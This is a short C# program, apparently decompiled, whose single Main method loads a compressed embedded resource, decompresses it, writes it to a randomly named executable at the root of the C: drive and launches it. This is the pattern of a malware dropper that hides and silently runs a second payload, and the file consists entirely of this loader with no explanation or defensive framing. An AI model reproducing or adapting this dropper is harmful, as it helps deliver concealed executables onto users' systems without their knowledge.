using System;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
internal sealed class Module1
{
	[STAThread]
	public static void Main()
	{
		ResourceManager resourceManager = new ResourceManager("res", Assembly.GetExecutingAssembly());
		string text = "C:\\TxSaOOtx.exe";
		byte[] bytData = (byte[])resourceManager.GetObject("temp");
		bytData = GZip.Decompress(bytData);
		File.WriteAllBytes(text, bytData);
		Interaction.Shell(text, (AppWinStyle)1, false, -1);
		Thread.Sleep(500);
	}
}
